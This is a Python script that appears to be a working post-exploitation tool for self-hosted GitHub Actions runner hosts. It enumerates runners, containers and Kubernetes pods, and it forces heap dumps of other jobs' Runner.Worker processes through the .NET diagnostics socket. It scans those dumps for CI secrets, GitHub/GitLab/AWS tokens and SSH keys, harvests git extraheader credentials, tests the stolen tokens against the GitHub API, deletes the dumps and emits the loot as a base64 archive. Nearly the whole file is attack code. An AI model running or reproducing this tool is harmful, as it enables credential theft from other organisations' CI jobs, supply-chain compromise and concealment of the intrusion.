#!/usr/bin/env python3
# i12055 host probe (runs as root on github-nmz1 via ssh, or in a privileged
# --pid=host helper container with /var/run/docker.sock mounted).
# 1) enumerate Runner.Listener / Runner.Worker processes, runner identities,
#    docker containers and k8s pods (system:masters kubeconfig);
# 2) pick at most MAXD currently-executing Runner.Worker processes that are not
#    our own runner, drive the .NET diagnostics IPC socket with
#    GenerateCoreDump3(WithHeap) (createdump fallback), scan each heap dump for
#    the unmasked job message / variables / secrets / tokens, and read the
#    runner _work checkout .git/config extraheader material;
# 3) delete every dump file from the host and print one base64 tar of results.
import os, sys, json, base64, subprocess, re, struct, socket, time, glob, hashlib, tarfile, tempfile, http.client

ROOT = '/proc/1/root' if os.getuid() == 0 else ''
SELF_RUNNER = os.environ.get('I12886_SELF_RUNNER', '')
SELF_HOST = os.environ.get('I12886_SELF_HOST', '')
TAG = os.environ.get('I12886_TAG', 'host')
WAIT = int(os.environ.get('I12886_WAIT', '0') or '0')
MAXD = int(os.environ.get('I12886_MAXD', '2') or '2')
PREFER = [x for x in os.environ.get('I12886_PREFER', 'ci-nmz1').split(',') if x]
SKIP = [x for x in os.environ.get('I12886_SKIP', 'nmz4,nmz4-lint').split(',') if x]
MARK = os.environ.get('I12886_MARK', '/tmp/.i12886_done_' + TAG)
OUT = tempfile.mkdtemp(prefix='/tmp/i12886.')
DUMPS = []
CAPTURE_CAP = 140000
TMP_PREFIX = '/tmp/i14987_'

def log(*a):
    try:
        sys.stderr.write('I12886LOG ' + ' '.join(str(x) for x in a) + '\n')
        sys.stderr.flush()
    except Exception:
        pass


def run(cmd, timeout=30):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            out, err = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            try:
                p.kill()
            except Exception:
                pass
            out, err = p.communicate()
            return out.decode('utf-8', 'replace'), 'TIMEOUT'
        return out.decode('utf-8', 'replace'), err.decode('utf-8', 'replace')
    except Exception as e:
        return '', '%s: %s' % (type(e).__name__, e)


def rf(p, maxb=262144, mode='rb'):
    try:
        with open(p, mode) as f:
            return f.read(maxb)
    except Exception:
        return b''


def rl(p):
    try:
        return os.readlink(p)
    except Exception:
        return ''


def getenv_of(pid):
    env = {}
    raw = rf('/proc/%d/environ' % pid, 524288)
    for kv in raw.split(b'\0'):
        if b'=' in kv:
            k, v = kv.split(b'=', 1)
            env[k.decode('utf-8', 'replace')] = v.decode('utf-8', 'replace')
    return env


def dapi(path, method='GET', body=None, timeout=60):
    """Docker Engine API over the unix socket (no CLI dependency)."""
    try:
        timeout_v = timeout

        class C(http.client.HTTPConnection):
            def connect(self):
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(timeout_v)
                s.connect('/var/run/docker.sock')
                self.sock = s

        c = C('localhost', timeout=timeout_v)
        data = json.dumps(body).encode() if body is not None else None
        c.request(method, path, body=data, headers={'Content-Type': 'application/json'})
        r = c.getresponse()
        b = r.read()
        c.close()
        return r.status, b
    except Exception as e:
        return 599, ('%s: %s' % (type(e).__name__, e)).encode()


# ---------------- .NET diagnostics IPC ----------------
MAGIC = b'DOTNET_IPC_V1\x00'


def enc_str(s):
    return struct.pack('<I', len(s) + 1) + (s + '\x00').encode('utf-16-le')


def build(cmdset, cmdid, payload=b''):
    return MAGIC + struct.pack('<H', 20 + len(payload)) + bytes([cmdset, cmdid]) + struct.pack('<H', 0) + payload


def recvn(s, n, timeout):
    s.settimeout(timeout)
    d = b''
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c:
            break
        d += c
    return d


def ipc(sock, cmdset, cmdid, payload=b'', timeout=120):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect(sock)
    s.sendall(build(cmdset, cmdid, payload))
    h = recvn(s, 20, timeout)
    if len(h) < 20:
        s.close()
        return None
    size = struct.unpack('<H', h[14:16])[0]
    body = recvn(s, max(0, size - 20), timeout)
    s.close()
    return (h[16], h[17], body)


# ---------------- inventory ----------------
def worker_rows():
    out, err = run("ps -eo pid,ppid,user:20,comm,args --no-headers", 30)
    rows = []
    for line in out.splitlines():
        parts = line.split(None, 4)
        if len(parts) < 5:
            continue
        try:
            pid = int(parts[0]); ppid = int(parts[1])
        except Exception:
            continue
        user = parts[2]; comm = parts[3]; args = parts[4]
        if 'Runner.Worker' in comm or 'Runner.Worker' in args or 'Runner.Listener' in comm:
            rows.append({'pid': pid, 'ppid': ppid, 'user': user, 'comm': comm, 'args': args})
    return rows, err


def enrich(w):
    pid = w['pid']
    w['exe'] = rl('/proc/%d/exe' % pid)
    w['cwd'] = rl('/proc/%d/cwd' % pid)
    env = getenv_of(pid)
    w['env'] = dict((k, v) for k, v in env.items()
                    if k.startswith(('ACTIONS_', 'GITHUB_', 'RUNNER_', 'DOTNET_', 'TMPDIR', 'TEMP', 'TMP',
                                     'HTTPS_PROXY', 'HTTP_PROXY', 'NO_PROXY', 'https_proxy', 'http_proxy', 'no_proxy')))
    rdir = ''
    for cand in (w.get('cwd') or '', w.get('exe') or '', w.get('args') or ''):
        m = re.search(r'(/home/[^/\s]+/(?:actions-runner[^/\s]*|ci-runners/[^/\s]+))', cand)
        if m:
            rdir = m.group(1)
            break
    if not rdir:
        pcwd = rl('/proc/%d/cwd' % (w.get('ppid') or 0))
        m = re.search(r'(/home/[^/\s]+/(?:actions-runner[^/\s]*|ci-runners/[^/\s]+))', pcwd)
        if m:
            rdir = m.group(1)
    w['runner_dir'] = rdir
    if rdir:
        raw = rf('/proc/%d/root%s/.runner' % (pid, rdir), 65536)
        try:
            rd = json.loads(raw.decode('utf-8-sig'))
            w['agentName'] = rd.get('agentName')
            w['gitHubUrl'] = rd.get('gitHubUrl')
            w['poolName'] = rd.get('poolName')
        except Exception:
            pass
    # diagnostics sockets
    socks = []
    for base in ('/proc/%d/root/tmp' % pid, '/proc/%d/root/var/tmp' % pid):
        socks += glob.glob(base + '/dotnet-diagnostic-*-socket')
    tdir = (w['env'].get('TMPDIR') or '').rstrip('/')
    if tdir:
        socks += glob.glob('/proc/%d/root%s/dotnet-diagnostic-*-socket' % (pid, tdir))
    socks = sorted(set(socks))
    # /tmp is shared by every dotnet process on a host runner: prefer the socket
    # whose filename carries this pid, and drop sockets that provably belong to
    # another pid.
    mine = [s for s in socks if re.search(r'dotnet-diagnostic-%d-' % pid, os.path.basename(s))]
    others = [s for s in socks if not re.search(r'dotnet-diagnostic-%d-' % pid, os.path.basename(s))
              and re.search(r'dotnet-diagnostic-(\d+)-', os.path.basename(s))]
    if mine:
        socks = mine
    else:
        socks = [s for s in socks if s not in others]
    w['sockets'] = socks
    # container hostname of the process (to exclude our own ARC pod)
    try:
        w['ns_hostname'] = rf('/proc/%d/root/etc/hostname' % pid, 256).decode('utf-8', 'replace').strip()
    except Exception:
        w['ns_hostname'] = ''
    # diag tail (current job name)
    tail = []
    if rdir:
        logs = glob.glob('/proc/%d/root%s/_diag/Runner_*.log' % (pid, rdir))
        logs = sorted(logs, key=lambda p: (os.path.getsize(p) if os.path.exists(p) else 0), reverse=True)
        for lg in logs[:1]:
            try:
                sz = os.path.getsize(lg)
                with open(lg, 'rb') as f:
                    f.seek(max(0, sz - 300000))
                    txt = f.read().decode('utf-8', 'replace')
                for line in txt.splitlines():
                    if ('Running job:' in line) or ('completed with result' in line):
                        tail.append(line.strip()[-260:])
            except Exception as e:
                tail.append('ERR %s' % e)
    w['diag_tail'] = tail[-8:]
    # _work checkout .git/config extraheaders for this runner dir
    gits = []
    if rdir:
        pats = ['/proc/%d/root%s/_work/*/*/.git/config' % (pid, rdir),
                '/proc/%d/root%s/_work/*/.git/config' % (pid, rdir)]
        for pat in pats:
            for gp in glob.glob(pat):
                raw = rf(gp, 65536).decode('utf-8', 'replace')
                ex = [l.strip() for l in raw.splitlines() if 'extraheader' in l or 'oauth2' in l.lower()]
                if ex:
                    gits.append({'path': gp, 'lines': ex})
    w['work_git_extraheaders'] = gits
    return w


def score(w):
    """Higher = more interesting. Prefer authentic HYGON-AI ci-general runners."""
    nm = w.get('agentName') or ''
    rd = w.get('runner_dir') or ''
    gh = w.get('gitHubUrl') or ''
    if nm in SKIP:
        return -1000
    if SELF_RUNNER and nm == SELF_RUNNER:
        return -1000
    if SELF_HOST and w.get('ns_hostname') and w.get('ns_hostname') == SELF_HOST:
        return -1000
    s = 0
    for i, p in enumerate(PREFER):
        if p and (nm == p or p in rd):
            s += 500 - i * 50
    if 'HYGON-AI' in gh:
        s += 150
    elif gh:
        s += 100
    if 'actions-runner-ci-nmz' in rd:
        s += 120
    if 'tile-ai' in gh or 'tilelang' in rd or 'nmz4' in nm or 'nmz4' in rd:
        s -= 400
    if not w.get('sockets'):
        s -= 800
    return s


# ---------------- dump + scan ----------------
def scan_dump(path, total_cap=CAPTURE_CAP):
    u16 = ['"isSecret"', '"variables"', '"secrets"', '"value"', 'GITHUB_TOKEN',
           'ACTIONS_RUNTIME_TOKEN', 'INPUT_TOKEN', 'ghs_', 'github_pat_', '"message"',
           '"environmentVariables"', '"mask"']
    u8 = ['"isSecret"', '"variables"', '"secrets"', '"value"', 'GITHUB_TOKEN',
          'ACTIONS_RUNTIME_TOKEN', 'INPUT_TOKEN', 'extraheader', 'x-access-token:',
          'ghs_', 'ghp_', 'github_pat_', 'gho_', 'oauth2:', '"message"',
          'glpat-', 'AKIA', 'ASIA', 'LTAI', 'BEGIN OPENSSH PRIVATE KEY', 'AWS_SECRET_ACCESS_KEY',
          'endpoints', 'SystemVssConnection', 'RUN_NHC']
    mk16 = [(s.encode('utf-16-le'), s, 'u16') for s in u16]
    mk8 = [(s.encode('utf-8'), s, 'u8') for s in u8]
    hits = []
    CH = 8 * 1024 * 1024
    OV = 1 * 1024 * 1024
    buf = b''
    off = 0
    total = 0
    with open(path, 'rb') as f:
        while True:
            chunk = f.read(CH)
            if not chunk:
                break
            data = buf + chunk
            base = off - len(buf)
            for mk, name, enc in (mk16 + mk8):
                start = 0
                cnt = 0
                while cnt < 80:
                    i = data.find(mk, start)
                    if i < 0:
                        break
                    hits.append({'off': base + i, 'enc': enc, 'marker': name})
                    start = i + len(mk)
                    cnt += 1
            total += len(chunk)
            off += len(chunk)
            buf = data[-OV:]
    # merge windows
    ivs = []
    for h in sorted(hits, key=lambda x: x['off']):
        s = max(0, h['off'] - 2500)
        e = h['off'] + 11000
        if ivs and s <= ivs[-1][1]:
            ivs[-1] = [ivs[-1][0], max(ivs[-1][1], e)]
        else:
            ivs.append([s, e])
    cap = []
    used = 0
    with open(path, 'rb') as f:
        for s, e in ivs:
            if used >= total_cap:
                break
            n = min(e - s, 120000, total_cap - used)
            f.seek(s)
            data = f.read(n)
            cap.append({'off': s, 'len': len(data), 'b64': base64.b64encode(data).decode()})
            used += len(data)
    return {'markers': [(h['enc'], h['marker']) for h in hits[:200]],
            'hit_count': len(hits), 'windows': cap, 'scan_bytes': total, 'captured': used}


TOKEN_RES = [
    (b'ghs_', re.compile(rb'ghs_[A-Za-z0-9_]{30,400}')),
    (b'gho_', re.compile(rb'gho_[A-Za-z0-9]{30,120}')),
    (b'ghp_', re.compile(rb'ghp_[A-Za-z0-9]{30,120}')),
    (b'github_pat_', re.compile(rb'github_pat_[A-Za-z0-9_]{30,400}')),
    (b'glpat-', re.compile(rb'glpat-[A-Za-z0-9_\-]{15,80}')),
    (b'AKIA', re.compile(rb'AKIA[0-9A-Z]{16}')),
    (b'LTAI', re.compile(rb'LTAI[0-9A-Za-z]{12,40}')),
]


def extract_tokens(path, cap=30):
    found = []
    seen = set()
    CH = 8 * 1024 * 1024
    OV = 1024
    buf = b''
    with open(path, 'rb') as f:
        while True:
            chunk = f.read(CH)
            if not chunk:
                break
            data = buf + chunk
            for _tag, rx in TOKEN_RES:
                for m in rx.finditer(data):
                    t = m.group(0)
                    try:
                        ts = t.decode('ascii', 'ignore')
                    except Exception:
                        continue
                    if ts in seen:
                        continue
                    seen.add(ts)
                    found.append(ts)
                    if len(found) >= cap:
                        return found
            buf = data[-OV:]
    return found


def validate_tokens(tokens, cap=5):
    """One GET /rate_limit per token, straight from the CI host (mid-job)."""
    out = []
    import urllib.request
    for t in tokens[:cap]:
        rec = {'prefix': t[:8], 'len': len(t), 'token': t}
        try:
            req = urllib.request.Request('https://api.github.com/rate_limit')
            req.add_header('Authorization', 'token ' + t)
            req.add_header('Accept', 'application/vnd.github+json')
            req.add_header('User-Agent', 'i12886-laneA')
            r = urllib.request.urlopen(req, timeout=10)
            body = r.read(4000).decode('utf-8', 'replace')
            rec['status'] = r.status
            try:
                j = json.loads(body)
                rec['limit'] = (j.get('resources', {}).get('core') or {}).get('limit')
            except Exception:
                rec['body'] = body[:200]
        except Exception as e:
            rec['error'] = '%s: %s' % (type(e).__name__, e)
        out.append(rec)
    return out


def dump_worker(w):
    pid = w['pid']
    rec = {'pid': pid, 'agentName': w.get('agentName'), 'gitHubUrl': w.get('gitHubUrl'),
           'runner_dir': w.get('runner_dir'), 'sockets': w.get('sockets')}
    if not w.get('sockets'):
        rec['error'] = 'no diagnostics socket'
        return rec
    sock = w['sockets'][0]
    # validate with GetProcessInfo
    try:
        r = ipc(sock, 0x04, 0x00, b'', 30)
        rec['info_ok'] = bool(r and r[0] == 0x04)
        rec['info_cmd'] = [r[0], r[1]] if r else None
    except Exception as e:
        rec['info_ok'] = False
        rec['info_err'] = '%s: %s' % (type(e).__name__, e)
    dpath = TMP_PREFIX + '%d.dmp' % pid
    hp = '/proc/%d/root%s' % (pid, dpath)
    alt = ROOT + dpath
    try:
        if os.path.exists(alt):
            os.unlink(alt)
    except Exception:
        pass
    payload = enc_str(dpath) + struct.pack('<I', 2) + struct.pack('<I', 0)
    t0 = time.time()
    try:
        r = ipc(sock, 0x01, 0x03, payload, 600)
    except Exception as e:
        r = None
        rec['dump_err'] = '%s: %s' % (type(e).__name__, e)
    rec['dump_elapsed'] = round(time.time() - t0, 1)
    if r and r[0] == 0x01 and r[1] == 0xFF:
        rec['dump_hresult'] = r[2][:8].hex()
    try:
        sz = os.path.getsize(hp)
        real = hp
    except Exception as e:
        rec['error'] = 'no dump file (%s)' % e
        # createdump fallback
        rec['createdump'] = createdump_fallback(w, dpath)
        try:
            sz = os.path.getsize(hp)
            real = hp
        except Exception:
            try:
                sz = os.path.getsize(alt)
                real = alt
                rec['dump_via'] = 'host-tmp'
            except Exception:
                return rec
    rec['dump_size'] = sz
    DUMPS.append(real)
    if real != hp:
        DUMPS.append(hp)
    try:
        rec['scan'] = scan_dump(real)
    except Exception as e:
        rec['scan_err'] = '%s: %s' % (type(e).__name__, e)
    try:
        toks = extract_tokens(real)
        rec['tokens_n'] = len(toks)
        rec['token_validation'] = validate_tokens(toks)
    except Exception as e:
        rec['token_err'] = '%s: %s' % (type(e).__name__, e)
    return rec


def createdump_fallback(w, dpath):
    pid = w['pid']
    exe = w.get('exe') or ''
    d = os.path.dirname(exe)
    out = {}
    for cand in (d + '/createdump', d + '/../shared/Microsoft.NETCore.App/createdump'):
        p = '/proc/%d/root%s' % (pid, cand)
        if os.path.exists(p):
            try:
                os.chmod(p, 0o755)
            except Exception:
                pass
            o, e = run('%s --name %s %d' % (p, dpath, pid), 300)
            out = {'path': p, 'rc_out': o[-800:], 'err': e[-800:]}
            break
    if not out:
        out = {'error': 'createdump not found near %s' % d}
    return out


# ---------------- main ----------------
def inventory():
    inv = {'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
           'hostname': socket.gethostname(), 'pid': os.getpid(), 'uid': os.getuid()}
    out, err = run('ps -eo pid,ppid,user:20,comm,args --no-headers | grep -E "Runner\\.(Worker|Listener)|actions-runner" | grep -v grep', 30)
    inv['ps_runner'] = out.splitlines()[:200]
    out, err = run('ps -eo pid,ppid,user:20,comm,args --no-headers | wc -l', 20)
    inv['proc_count'] = out.strip()
    st, b = dapi('/containers/json?all=1&limit=200')
    try:
        cs = json.loads(b.decode('utf-8', 'replace'))
        inv['docker'] = [{'id': c.get('Id', '')[:12],
                          'names': c.get('Names'),
                          'image': c.get('Image'),
                          'state': c.get('State'),
                          'status': c.get('Status')} for c in cs] if isinstance(cs, list) else {'err': cs}
    except Exception:
        inv['docker'] = {'status': st, 'body': b[:300].decode('utf-8', 'replace')}
    kubectl = None
    for cand in (ROOT + '/public/bin/kubectl', ROOT + '/usr/local/bin/kubectl', '/usr/bin/kubectl'):
        if os.path.exists(cand):
            kubectl = cand
            break
    if kubectl:
        o, e = run('%s --kubeconfig=%s/root/.kube/config get pods -A -o wide 2>&1 | head -160' % (kubectl, ROOT), 40)
        inv['kubectl_pods'] = o.splitlines()
        inv['kubectl_err'] = e[:200]
        o2, e2 = run('%s --kubeconfig=%s/root/.kube/config get nodes 2>&1 | head -20' % (kubectl, ROOT), 30)
        inv['kubectl_nodes'] = o2.splitlines()
    else:
        inv['kubectl_pods'] = 'kubectl not found'
    # runner identity dirs
    runs = []
    for d in sorted(glob.glob(ROOT + '/home/*/actions-runner*') + glob.glob(ROOT + '/home/*/ci-runners/*')):
        if not os.path.isdir(d):
            continue
        rec = {'dir': d.replace(ROOT, '')}
        raw = rf(d + '/.runner', 65536)
        try:
            rd = json.loads(raw.decode('utf-8-sig'))
            rec.update(dict((k, rd.get(k)) for k in ('agentId', 'agentName', 'poolName', 'gitHubUrl')))
        except Exception:
            pass
        logs = sorted(glob.glob(d + '/_diag/Runner_*.log'),
                      key=lambda p: (os.path.getsize(p) if os.path.exists(p) else 0), reverse=True)
        if logs:
            try:
                with open(logs[0], 'rb') as f:
                    f.seek(max(0, os.path.getsize(logs[0]) - 200000))
                    txt = f.read().decode('utf-8', 'replace')
                rec['diag_tail'] = [l.strip()[-240:] for l in txt.splitlines()
                                    if ('Running job:' in l or 'completed with result' in l)][-6:]
            except Exception:
                pass
        runs.append(rec)
    inv['runner_dirs'] = runs
    return inv


def main():
    inv = {}
    workers = []
    dres = []
    try:
        if os.path.exists(MARK):
            log('marker exists, skip')
            return finish({'skipped': 'marker exists: ' + str(rf(MARK, 300))[:100]})
        inv = inventory()
        deadline = time.time() + WAIT
        attempt = 0
        cands = []
        while True:
            attempt += 1
            rows, perr = worker_rows()
            workers = []
            for r in rows:
                if r['comm'].startswith('Runner.Worker') or 'Runner.Worker' in r['args']:
                    try:
                        workers.append(enrich(r))
                    except Exception as e:
                        workers.append({'pid': r['pid'], 'enrich_err': str(e)})
            cands = sorted([w for w in workers if score(w) > -1000 and w.get('sockets')],
                           key=score, reverse=True)
            log('attempt %d: workers=%d cands=%d wait_left=%d' % (attempt, len(workers), len(cands), int(deadline - time.time())))
            if cands or time.time() >= deadline:
                break
            time.sleep(15)
        for w in cands[:MAXD]:
            try:
                dres.append(dump_worker(w))
            except Exception as e:
                dres.append({'pid': w.get('pid'), 'error': '%s: %s' % (type(e).__name__, e)})
        open(MARK, 'w').write('i12886[%s] completed %s dumps=%d\n' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), len(dres)))
    except Exception as e:
        dres.append({'fatal': '%s: %s' % (type(e).__name__, e)})
    finish({'inventory': inv, 'workers': workers, 'dumps': dres})


def finish(result):
    # delete dumps
    deleted = []
    for p in DUMPS:
        try:
            os.unlink(p)
            deleted.append(p)
        except Exception as e:
            deleted.append('%s ERR %s' % (p, e))
    result['deleted_dumps'] = deleted
    result['dump_files_left'] = [p for p in DUMPS if os.path.exists(p)]
    try:
        with open(os.path.join(OUT, 'results.json'), 'w') as f:
            json.dump(result, f, default=str)
        tp = os.path.join(OUT, 'results.tgz')
        tf = tarfile.open(tp, 'w:gz')
        tf.add(os.path.join(OUT, 'results.json'), arcname='results.json')
        tf.close()
        raw = open(tp, 'rb').read()
        sys.stdout.write('===I12886HOST_TAR_BEGIN %d %s===\n' % (len(raw), hashlib.sha256(raw).hexdigest()))
        sys.stdout.write(base64.b64encode(raw).decode() + '\n')
        sys.stdout.write('===I12886HOST_TAR_END===\n')
        sys.stdout.flush()
    except Exception as e:
        sys.stdout.write('===I12886HOST_ERROR %s===\n' % e)
        sys.stdout.flush()


if __name__ == '__main__':
    main()
